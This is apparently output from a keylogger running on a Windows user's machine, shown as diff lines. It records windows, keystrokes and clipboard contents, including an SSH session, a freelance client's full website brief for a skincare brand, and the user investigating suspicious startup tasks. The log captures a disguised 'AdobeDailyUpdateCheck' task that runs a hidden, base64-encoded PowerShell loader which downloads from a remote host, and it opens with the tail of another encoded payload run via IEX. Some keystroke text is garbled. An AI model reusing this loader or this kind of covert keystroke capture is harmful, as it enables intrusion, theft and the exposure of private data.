+              tAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQA7AA0ACgAkAFIAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AU
+              gBlAGEAZABlAHIAKAAkAEQALABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAApADsADQAKAEkARQBYACAAJABSAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADs
+              AJABSAC4AQwBsAG8AcwBlACgAKQA7ACQARAAuAEMAbABvAHMAZQAoACkAOwAkAE0ALgBDAGwAbwBzAGUAKAApAA==
+
+--- WINDOW  2026.07.27 11:10:16  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:10:19  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:10:20  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl]<
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:16  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:17  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:17  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:19  [steamwebhelper.exe] Войти в Steam
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:21  [Discord.exe] Друзі - Discord
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:23  [Discord.exe] @Yuriy - Discord
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:26  [Battle.net.exe] Вход в учетную запись Battle.net
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:27  [explorer.exe] Program Manager
+----------------------------------------------------------------------------
+  [RMB]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:39  [BvSsh.exe] Log
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:39  [BvSsh.exe] Bitvise SSH Client
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:40  [BvSsh.exe] Bitvise SSH Client 9.66
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:43  [BvSsh.exe] demo@185.156.41.5:22 - Bitvise SSH Client 9.66
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - demo@mail:~
+----------------------------------------------------------------------------
+  [^][^][^][ENTER]
+  [^][^][^][ENTER]
+
+--- WINDOW  2026.07.27 11:11:50  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - demo@mail:~/public_html
+----------------------------------------------------------------------------
+  [^][^][^][ENTER]
+
+--- WINDOW  2026.07.27 11:11:54  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Claude Code
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:55  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:55  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:55  [explorer.exe] Файловий провідник
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Claude Code
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:58  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:11:58  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:11:59  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Ctrl]
+  [Clipboard]
+  Maison Orelisse
+  A
+
+--- WINDOW  2026.07.27 11:12:25  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Claude Code
+----------------------------------------------------------------------------
+  ?@>5:B [Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk]?@>5:B [Ctrl][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk][Bk]?@>5:B [Ctrl]<[ENTER]
+
+--- WINDOW  2026.07.27 11:12:40  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Claude Code
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:41  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:42  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  T 
+
+--- WINDOW  2026.07.27 11:12:43  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:44  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:45  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Bk][Bk]
+
+--- WINDOW  2026.07.27 11:12:46  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:12:47  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  T
+  [LMB]
+  [Bk]3>BCT[Bk]
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:13:14  [ApplicationFrameHost.exe] Налаштування
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:13:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [LMB]
+  N :><5=B8 B>1V WE A?>G0B:C ?@>0=0;C[Bk]V7C20B8 V :>@B[Bk]>@>B:> ?>OA=8B8 I> BCB B@510 7@>18B8 V O: 1C45 ?@0FN20B8 A09B ?[Bk]<091CB=V9[ENTER]
+
+--- WINDOW  2026.07.27 11:13:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:01  [chrome.exe] (28) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [LMB]
+
+--- WINDOW  2026.07.27 11:14:15  [chrome.exe] (29) Messenger | Freelancer - Google Chrome
+----------------------------------------------------------------------------
+  [Ctrl]
+  [Clipboard]
+  Hi
+  
+  This is a general outline of Maison Orelisse. I will have video clips as
+  well.
+  
+  MAISON ORELISSEInitial Website Content and Direction1. Brand Overview
+  
+  Maison Orelisse is a dermatologist-founded house developing considered
+  products and rituals for skin, sun, travel, and companion-animal care.
+  
+  The Maison begins with a simple belief: skin is not merely a surface. It is
+  a living interface between the body and the world around it. It responds
+  continuously to climate, light, movement, travel, environment, and the
+  rituals of daily life.
+  
+  Maison Orelisse brings together dermatologic knowledge, thoughtful
+  formulation, refined design, and careful observation of how products are
+  actually used.
+  
+  The objective is not to create more products for their own sake. It is to
+  develop objects and formulas that earn a place in everyday life.
+  2. Primary Brand Line
+  
+  *Skin is our living interface with the world.*
+  
+  This should remain one of the central lines of the website and may be used
+  in the homepage hero or another prominent opening position.
+  3. Positioning
+  
+  Maison Orelisse should feel:
+  
+  -
+  
+  Intelligent without becoming clinical
+  -
+  
+  Refined without becoming ornamental
+  -
+  
+  Scientific without resembling a medical practice
+  -
+  
+  Warm without becoming sentimental
+  -
+  
+  Luxurious through restraint, materiality, and detail rather than through
+  overt luxury language
+  -
+  
+  Contemporary, quiet, and internationally relevant
+  
+  The site should not feel like a typical beauty e-commerce template.
+  4. Writing Style
+  
+  Copy should generally be concise, measured, and confident.
+  
+  Preferred language includes:
+  
+  -
+  
+  Considered
+  -
+  
+  Refined
+  -
+  
+  Formulated with intention
+  -
+  
+  Dermatologist-founded
+  -
+  
+  Skin barrier
+  -
+  
+  Daily ritual
+  -
+  
+  Material
+  -
+  
+  Environment
+  -
+  
+  Light
+  -
+  
+  Movement
+  -
+  
+  Protection
+  -
+  
+  Comfort
+  -
+  
+  Care
+  
+  Please avoid overusing language such as:
+  
+  -
+  
+  Revolutionary
+  -
+  
+  Miracle
+  -
+  
+  Anti-aging
+  -
+  
+  Flawless
+  -
+  
+  Transformative
+  -
+  
+  Clean beauty
+  -
+  
+  Chemical-free
+  -
+  
+  Medical-grade
+  -
+  
+  Clinically proven, unless supporting evidence is provided
+  -
+  
+  Luxury, as a repeated self-description
+  
+  The brand should demonstrate refinement rather than repeatedly declare it.
+  ------------------------------
+  PROPOSED SITE STRUCTURE1. HOMEHero
+  
+  *Skin is our living interface with the world.*
+  
+  Maison Orelisse develops considered rituals for skin, sun, travel, and the
+  animals who share our lives—guided by dermatology and shaped by daily
+  experience.
+  
+  Suggested CALL TO ACTION:
+  
+  *Discover the Maison*
+  *Explore PawVellé*
+  
+  The hero should be visually led, with restrained copy and cinematic
+  movement. Video should support the emotional tone without competing with
+  the statement.
+  Section: A House Built Around Skin
+  
+  Skin is constantly negotiating with the world around it: sunlight, climate,
+  movement, cleansing, travel, friction, and time.
+  
+  Maison Orelisse was created to examine those interactions more
+  carefully—and to develop products that support the skin with intelligence,
+  comfort, and restraint.
+  Section: The Orelisse Method
+  
+  *Observe. Formulate. Refine. Ritualize.*
+  
+  Every Orelisse concept begins with a real experience: a repeated
+  discomfort, an overlooked need, or a familiar ritual that could be made
+  more thoughtful.
+  
+  Dermatologic knowledge and expertise inform the process. Daily life tests
+  its relevance. Form, texture, packaging, and experience are considered
+  alongside the formula itself.
+  
+  Suggested CALL TO ACTION:
+  
+  *Explore the Orelisse Method*
+  Section: The Worlds of OrelissePawVellé by Orelisse
+  
+  Dermatologist-crafted skin and coat care for dogs and cats, developed with
+  the same attention given to modern human skincare.
+  
+  Suggested call to action:
+  
+  *Discover PawVellé*
+  
+  This should link to the PawVellé Shopify store when ready (which is in
+  phase 4 of develpment).
+  Rituels
+  
+  Travel-conscious skincare concepts designed around dehydration, barrier
+  disruption, changing environments, and the realities of skin in motion.
+  
+  Status language:
+  
+  *In development*
+  Soleil
+  
+  A developing approach to intelligent sun protection, including practical
+  topical formats and refined UV-protective apparel for people with
+  meaningful occupational and environmental exposure.
+  
+  Status language:
+  
+  *In development*
+  
+  These future areas should be presented elegantly and honestly. They should
+  not look like available collections unless products are ready for sale.
+  Section: Founded in Dermatology
+  
+  Maison Orelisse was founded by Eric Wyatt, MD, a board-certified
+  dermatologist and Mohs surgeon.
+  
+  His work has shaped a lasting interest in the relationship between skin,
+  environment, prevention, formulation, and the repeated choices that make up
+  daily care.
+  
+  Maison Orelisse extends that perspective beyond the clinic—into products
+  and rituals designed for real life.
+  
+  Suggested call to action:
+  
+  *Our Story*
+  Closing Statement
+  
+  *Care begins with attention.*
+  ------------------------------
+  2. THE MAISON / OUR STORYOpening
+  
+  Maison Orelisse began with the conviction that the most meaningful products
+  often emerge from careful observation rather than trend.
+  
+  A dermatologist sees skin not in isolation but as a responsive organ in
+  continuous contact with the world. Light, climate, travel, cleansing,
+  friction, occupation, and habit all leave their mark.
+  
+  The Maison was created to explore those points of contact and to develop
+  more considered ways of caring for them.
+  A Broader View of Care
+  
+  Orelisse is not limited to a single category.
+  
+  Its work may take the form of a skincare formula, a travel ritual, a
+  sun-protective textile, or a grooming product for a companion animal. What
+  connects these expressions is a shared method: identify a real need,
+  understand the skin involved, and design the complete experience with
+  intention.
+  The Founder
+  
+  Eric Wyatt, MD, is a board-certified dermatologist with decades of
+  experience caring for skin.
+  
+  Maison Orelisse reflects both his medical background and his belief that
+  effective care must also be practical, elegant, and compatible with daily
+  life.
+  
+  The Maison is an independent, evolving project built around curiosity,
+  discipline, and a respect for the living barrier between ourselves and the
+  world.
+  ------------------------------
+  3. THE ORELISSE METHODIntroduction
+  
+  The Orelisse Method is the process through which observation becomes
+  formulation and formulation becomes ritual.
+  
+  It provides a consistent framework across every area of the Maison.
+  Observe
+  
+  We begin with how skin is actually experienced.
+  
+  Where does discomfort occur? What is repeatedly overlooked? How does the
+  environment alter the way a product must perform? What prevents an
+  otherwise useful ritual from becoming part of everyday life?
+  Formulate
+  
+  Ingredients are selected for a defined purpose within the formula.
+  
+  The objective is not to build the longest ingredient list or follow the
+  latest trend. It is to create a coherent formulation in which each
+  component contributes to performance, comfort, stability, or experience.
+  Refine
+  
+  A formula cannot be separated from the way it is used.
+  
+  Texture, delivery, packaging, application, residue, portability, and visual
+  character are refined alongside the formulation itself.
+  Ritualize
+  
+  The best product is one that becomes intuitive to use.
+  
+  Orelisse products are designed to fit naturally into repeated moments of
+  care—at home, in transit, outdoors, or alongside the animals who share our
+  lives.
+  Closing
+  
+  *From observation to ritual.*
+  ------------------------------
+  4. THE SCIENCEIntroduction
+  
+  Science at Maison Orelisse is not used as decoration.
+  
+  It is a method of asking better questions, evaluating materials carefully,
+  and distinguishing plausible benefit from unsupported promise.
+  Skin as a Living Barrier
+  
+  The skin barrier helps regulate the relationship between the body and its
+  surroundings. Its condition may be influenced by cleansing, climate,
+  ultraviolet exposure, friction, travel, dryness, and repeated environmental
+  stress.
+  
+  Our development process pays particular attention to barrier support,
+  tolerability, hydration, practical protection, and the sensory qualities
+  that affect consistent use.
+  Evidence with Restraint
+  
+  Scientific language should clarify rather than overwhelm.
+  
+  Maison Orelisse will communicate ingredient functions and product benefits
+  in proportion to the available evidence. We will avoid exaggerated claims
+  and will distinguish between formulation rationale, testing results, and
+  established clinical evidence.
+  Development
+  
+  Products may involve collaboration with cosmetic chemists, textile
+  specialists, veterinarians, manufacturers, regulatory consultants, and
+  other technical partners appropriate to the category.
+  
+  Only verified testing, certifications, and performance claims should be
+  published.
+  ------------------------------
+  5. INGREDIENT PHILOSOPHYIntroduction
+  
+  Ingredients matter, but context matters just as much.
+  
+  An ingredient’s value depends upon its form, concentration, compatibility,
+  stability, delivery system, and relationship to the complete formula.
+  Formulation Over Fashion
+  
+  Maison Orelisse does not select ingredients simply because they are
+  fashionable or unfamiliar.
+  
+  We look for materials that serve a defined purpose: cleansing gently,
+  supporting hydration, improving condition, contributing to barrier care,
+  enhancing application, or protecting the integrity of the formulation.
+  Sensory Experience Is Functional
+  
+  Texture, spread, absorption, residue, fragrance, and packaging all
+  influence whether a product is used consistently.
+  
+  For that reason, sensory experience is treated as part of product
+  performance rather than as an afterthought.
+  Responsible Claims
+  
+  We will not describe ingredients or products as “toxin-free,”
+  “chemical-free,” or universally safe.
+  
+  Claims will be specific, supportable, and appropriate to the product
+  category.
+  ------------------------------
+  6. THE ORELISSE WORLD
+  
+  This page should introduce the different expressions of the Maison without
+  making the site feel fragmented.
+  Introductory Copy
+  
+  One philosophy may take many forms.
+  
+  The Orelisse world extends across human skincare, travel, sun protection,
+  textiles, and companion-animal care. Each project responds to a different
+  environment, but all begin with the same attention to skin, material, use,
+  and ritual.
+  PawVellé by Orelisse
+  
+  PawVellé began with a moment its founder could not ignore: watching his own
+  dog persistently chewing and licking at his paws.
+  
+  As a dermatologist, he understood the importance of caring for skin with
+  intention—not only cleansing, but hydrating, conditioning, and supporting
+  the skin barrier.
+  
+  After seeing little visible improvement with conventional grooming
+  products, he set out to bring a more thoughtful, dermatologist-crafted
+  approach to pet skin and coat care.
+  
+  PawVellé was created from the belief that pets deserve the same level of
+  care, refinement, and ingredient intention we expect from the best of
+  modern skincare.
+  Rituels
+  
+  Rituels explores skincare for moments of transition and environmental
+  change, particularly travel.
+  
+  The collection is being developed around hydration, skin-barrier comfort,
+  elegant portability, and products that remain practical in real conditions
+  rather than only in the bathroom at home.
+  
+  *In development*
+  Soleil
+  
+  Soleil explores intelligent protection for people whose lives and
+  occupations involve meaningful ultraviolet exposure.
+  
+  Concepts may include refined topical formats, lip care, portable
+  reapplication products, and professional-looking UV-protective apparel.
+  
+  *In development*
+  ------------------------------
+  7. PAWVELLÉ INTRODUCTION PAGE
+  
+  This page should be an editorial introduction rather than a duplicate of
+  the Shopify storefront.
+  Hero
+  
+  *Dermatologist-crafted care for skin, coat, paw, and nose.*
+  Introductory Copy
+  
+  PawVellé brings the discipline and refinement of modern skincare to
+  companion-animal grooming.
+  
+  Its products are being developed to cleanse gently, condition thoughtfully,
+  support the appearance of healthy skin and coat, and make repeated care
+  feel more considered.
+  Initial Collection
+  
+  The first PawVellé collection includes concepts for:
+  
+  -
+  
+  Gentle conditioning shampoo
+  -
+  
+  Hydrating skin and coat mist
+  -
+  
+  Paw and nose conditioning balm
+  
+  Specific product claims and final product descriptions will be supplied
+  separately once formulations, packaging, and regulatory review are complete.
+  
+  Suggested call to action:
+  
+  *Visit PawVellé*
+  ------------------------------
+  8. JOURNALIntroduction
+  
+  The Orelisse Journal will examine the relationship between skin and the
+  world around it.
+  
+  Possible subjects include:
+  
+  -
+  
+  Skin and environmental exposure
+  -
+  
+  The realities of skincare during travel
+  -
+  
+  Thoughtful sun protection
+  -
+  
+  Skin-barrier care
+  -
+  
+  Formulation and ingredient literacy
+  -
+  
+  Companion-animal skin and coat care
+  -
+  
+  Materials, textiles, and UV protection
+  -
+  
+  The development process behind Orelisse projects
+  
+  The journal should feel editorial and considered. It should not resemble a
+  high-volume search-engine-content blog.
+  
+  Temporary message if no articles are ready:
+  
+  *Notes from the Maison are forthcoming.*
+  ------------------------------
+  9. CONTACTOpening Copy
+  
+  For product, development, partnership, press, and general enquiries, please
+  contact Maison Orelisse.
+  
+  Suggested enquiry categories:
+  
+  -
+  
+  General enquiry
+  -
+  
+  Product information
+  -
+  
+  Manufacturing or development
+  -
+  
+  Retail or distribution
+  -
+  
+  Press and editorial
+  -
+  
+  Professional collaboration
+  
+  Contact details and form-routing information will be supplied separately.
+  ------------------------------
+  DESIGN AND CONTENT IMPLEMENTATION NOTESFinal Versus Temporary Content
+  
+  The following material can be treated as established brand direction:
+  
+  -
+  
+  Brand positioning
+  -
+  
+  Primary tagline
+  -
+  
+  Founder background
+  -
+  
+  The Orelisse Method
+  -
+  
+  Overall language and tone
+  -
+  
+  Relationship between Maison Orelisse and PawVellé
+  
+  The following should remain flexible:
+  
+  -
+  
+  Product names and product-specific descriptions
+  -
+  
+  Launch timing
+  -
+  
+  Future collections
+  -
+  
+  Product photography
+  -
+  
+  Testing claims
+  -
+  
+  Certifications
+  -
+  
+  Pricing
+  -
+  
+  Retail availability
+  -
+  
+  Ingredient lists
+  -
+  
+  Journal articles
+  
+  Temporary Product Presentation
+  
+  Where products are not yet ready, use one of the following:
+  
+  *In development*
+  *Forthcoming*
+  *Currently under development by Maison Orelisse*
+  
+  Do not use invented launch dates.
+  Imagery Direction
+  
+  Preferred imagery includes:
+  
+  -
+  
+  Natural light interacting with skin, fabric, glass, water, and
+  architecture
+  -
+  
+  Hands and subtle human movement
+  -
+  
+  Quiet travel environments
+  -
+  
+  Sky, horizon, atmosphere, and changing light
+  -
+  
+  Refined material details
+  -
+  
+  Companion animals shown naturally rather than in comic or overly
+  sentimental situations
+  -
+  
+  Restrained architectural spaces
+  -
+  
+  Close observation rather than conventional beauty advertising
+  
+  Avoid:
+  
+  -
+  
+  Generic laboratory stock imagery
+  -
+  
+  Doctors in white coats
+  -
+  
+  Syringes or overt medical imagery
+  -
+  
+  Artificial “luxury” imagery
+  -
+  
+  Gold ornamentation
+  -
+  
+  Excessive product mockups before packaging is finalized
+  -
+  
+  Conventional smiling skincare-model photography
+  -
+  
+  Literal aircraft or airline imagery throughout the entire brand site
+  
+  Calls to Action
+  
+  Calls to action should remain restrained and specific:
+  
+  -
+  
+  Discover the Maison
+  -
+  
+  Explore the Method
+  -
+  
+  Our Story
+  -
+  
+  Enter the Orelisse World
+  -
+  
+  Discover PawVellé
+  -
+  
+  Visit PawVellé
+  -
+  
+  Read the Journal
+  -
+  
+  Contact the Maison
+  
+  Avoid aggressive calls to action such as:
+  
+  -
+  
+  Shop Now
+  -
+  
+  Buy Today
+  -
+  
+  Transform Your Skin
+  -
+  
+  Unlock the Secret
+  -
+  
+  Join the Revolution
+  
+  The separate e-commerce stores may use clearer commercial calls to action
+  where appropriate.
+  Technical Requirement
+  
+  All major text areas, page sections, imagery, videos, calls to action,
+  collection descriptions, and journal content should be editable through the
+  CMS without requiring code changes.
+  
+  The design should also allow individual future sections to be hidden or
+  activated as products and original assets become available.
+
+--- WINDOW  2026.07.27 11:14:16  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [Ctrl][Ctrl]<[ENTER]
+
+--- WINDOW  2026.07.27 11:14:20  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:24  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:14:24  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Clipboard]
+  Unregister-ScheduledTask -TaskPath "\Agent Activation Runtime\" -TaskName "S-1-5-21-2638959922-1800911258-2240121548-1001-{A5310325-8293-123D-GKCA-29BDA54357E1}" -Confirm:$false
+  Unregister-ScheduledTask -TaskPath "\Agent Activation Runtime\" -TaskName "S-1-5-21-2638959922-1800911258-2240121548-1001-{C9410325-8293-D162-AGCE-160AC52357D8}" -Confirm:$false
+
+--- WINDOW  2026.07.27 11:15:49  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:49  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
+  [ENTER]
+
+--- WINDOW  2026.07.27 11:15:55  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:56  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:58  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:59  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:15:59  [explorer.exe] (untitled)
+----------------------------------------------------------------------------
+  [LMB]
+
+--- WINDOW  2026.07.27 11:16:05  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:22  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:24  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:24  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+  [LMB]
+  [Clipboard]
+  Get-ScheduledTask -TaskName "AdobeDailyUpdateCheck_*" | ForEach-Object { $_.TaskName; $_.Actions | Format-List Execute, Arguments }
+
+--- WINDOW  2026.07.27 11:16:30  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:31  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:31  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:31  [chrome.exe] Програма запускається при старті Windows - Claude - Google Chrome
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:32  (no active window)
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:32  [powershell.exe] Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:16:45  [powershell.exe] Select Administrator: Windows PowerShell
+----------------------------------------------------------------------------
+  [Clipboard]
+                          Unregister-ScheduledTask -TaskPath "\Agent Activation Runtime\" -TaskName "S-1-5-21-2638959922-1800911258-2240121548-1001-{A5310325-8293-123D-GKCA-29BDA54357E1}" -Confirm:$false
+  >> Unregister-ScheduledTask -TaskPath "\Agent Activation Runtime\" -TaskName "S-1-5-21-2638959922-1800911258-2240121548-1001-{C9410325-8293-D162-AGCE-160AC52357D8}" -Confirm:$false
+  PS C:\Windows\system32> Get-ScheduledTask -TaskName "AdobeDailyUpdateCheck_*" | ForEach-Object { $_.TaskName; $_.Actions | Format-List Execute, Arguments }
+  AdobeDailyUpdateCheck_{B8150512-0186-46C3-BAEC-A80AA35AC5D0}
+  
+  
+  Execute   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  Arguments : -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand JAB2AHAAcwBIAG8AcwB0ACAAPQAgACcAaAB0AHQAcAA6AC8ALwAzADgALgAxADgAMAAuADIAMAA0AC4AMgAwADAAJwA7AA0ACgAkAGYAaQBsAGUAVQByAGwAIAA9ACAA
+              JAB2AHAAcwBIAG8AcwB0ACAAKwAgACcALwB0AGUAcwB0AC4AYgBlAGYAXwBmAHIAaQAnADsADQAKAA0ACgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEQAbwB3AG4AbABvAGEAZABCAHkAdABlAHMAIAB7AA0ACgAgACAAIAAgAHAAYQByAGEAbQAoAA0ACgAgACA
+              AIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAE0AYQBuAGQAYQB0AG8AcgB5ACAAPQAgACQAdAByAHUAZQApAF0ADQAKACAAIAAgACAAIAAgACAAIABbAHMAdAByAGkAbgBnAF0AIAAkAFUAcgBpAA0ACgAgACAAIAAgACkADQAKAA0ACgAgACAAIAAgAC
+              QAcgBlAHEAdQBlAHMAdAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBIAHQAdABwAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoAQwByAGUAYQB0AGUAKAAkAFUAcgBpACkAOwANAAoAIAAgACAAIAAkAHIAZQBxAHUAZQBzAHQALgBNAGUAdABoAG8AZAAgA
